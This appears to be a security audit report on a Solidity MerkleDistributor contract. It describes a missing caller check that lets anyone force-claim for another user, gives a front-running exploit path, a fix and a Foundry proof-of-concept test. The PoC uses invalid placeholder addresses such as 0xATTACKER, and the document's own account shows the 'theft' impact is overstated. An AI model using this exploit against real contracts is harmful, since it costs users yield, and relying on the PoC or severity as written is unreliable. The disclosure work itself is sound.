Audit Report

## Title
Unrestricted `claim()` Allows Anyone to Force-Claim on Behalf of Any User, Stealing Fee-Portion of Yield - (File: contracts/utils/MerkleDistributor/MerkleDistributor.sol)

## Summary
`MerkleDistributor.claim()` accepts an arbitrary `account` parameter but performs no `msg.sender == account` check, allowing any external caller to trigger a claim for any user. When `feeInBPS > 0`, the forced claim permanently deducts a fee from the victim's claimable balance, transferring it to `protocolTreasury`. The victim receives fewer tokens than they are entitled to, with no recourse.

## Finding Description
`MerkleDistributor.claim()` is a fully permissionless external function: [1](#0-0) 

No `msg.sender == account` guard exists anywhere in the function body. After verifying the Merkle proof (which uses only public off-chain data), the function computes and permanently deducts a fee: [2](#0-1) 

The fee goes to `protocolTreasury`, not the attacker — but the victim's `userClaims[account].cumulativeAmount` is updated to `cumulativeAmount`, permanently consuming the claim at the current fee rate. The victim cannot re-claim.

The sibling contract `KernelMerkleDistributor._processClaim()` explicitly enforces the caller restriction: [3](#0-2) 

This confirms the protocol is aware of the requirement and intentionally applied it in `KernelMerkleDistributor` but omitted it from `MerkleDistributor`.

**Exploit path:**
1. Attacker reads a victim's leaf `(index, victim, cumulativeAmount)` and its Merkle proof from the publicly published tree.
2. Owner submits `setFeeInBPS(0)` to reduce the fee.
3. Attacker front-runs with `MerkleDistributor.claim(index, victim, cumulativeAmount, proof)` while `feeInBPS` is still high (up to 1000 BPS = 10%).
4. Contract deducts `fee = claimableAmount * feeInBPS / 10_000` and sends it to `protocolTreasury`.
5. Victim's claim is consumed; `setFeeInBPS(0)` executes but the victim's balance is already spent at the high fee rate.
6. Victim permanently loses up to 10% of their claimable yield.

## Impact Explanation
**High — Theft of unclaimed yield.** The fee is permanently removed from the victim's claimable balance. `MAX_FEE_IN_BPS = 1000` means up to 10% of any user's unclaimed yield can be stolen. The victim receives fewer tokens than they are entitled to, matching the "Theft of unclaimed yield" impact class exactly. [4](#0-3) 

## Likelihood Explanation
**High.** The function is fully permissionless. Merkle proofs are public off-chain data. No special privileges, capital, or complex setup are required. The attack is profitable whenever `feeInBPS > 0` and any user has an unclaimed balance. The front-running scenario (forcing claims before a fee reduction) is a straightforward mempool-monitoring attack requiring no victim interaction.

## Recommendation
Add a `msg.sender == account` check at the top of `claim()`, mirroring the pattern in `KernelMerkleDistributor._processClaim()`:

```solidity
if (account != msg.sender) {
    revert Unauthorized();
}
```

Alternatively, remove the `account` parameter and derive it from `msg.sender` directly.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/utils/MerkleDistributor/MerkleDistributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("T", "T") { _mint(msg.sender, 1_000_000e18); }
}

contract ForceClaimTest is Test {
    MerkleDistributor distributor;
    MockToken token;
    address treasury = address(0xTREASURY);
    address victim   = address(0xVICTIM);
    address attacker = address(0xATTACKER);

    function setUp() public {
        token = new MockToken();
        distributor = new MerkleDistributor();
        distributor.initialize(address(token), treasury, 500); // 5% fee

        // Build a single-leaf Merkle tree: leaf = keccak256(abi.encodePacked(1, victim, 1000e18))
        bytes32 leaf = keccak256(abi.encodePacked(uint256(1), victim, uint256(1000e18)));
        distributor.setMerkleRoot(leaf); // single-leaf root == leaf

        token.transfer(address(distributor), 1000e18);
    }

    function testForceClaim() public {
        bytes32[] memory proof = new bytes32[](0); // single-leaf tree needs no proof

        uint256 victimBefore   = token.balanceOf(victim);
        uint256 treasuryBefore = token.balanceOf(treasury);

        // Attacker calls claim on behalf of victim
        vm.prank(attacker);
        distributor.claim(1, victim, 1000e18, proof);

        // Victim receives 950e18 (5% fee deducted)
        assertEq(token.balanceOf(victim),   victimBefore   + 950e18);
        // Treasury receives 50e18 stolen from victim's yield
        assertEq(token.balanceOf(treasury), treasuryBefore + 50e18);
        // Victim's claim is now consumed — they cannot re-claim at 0% fee
    }
}
```
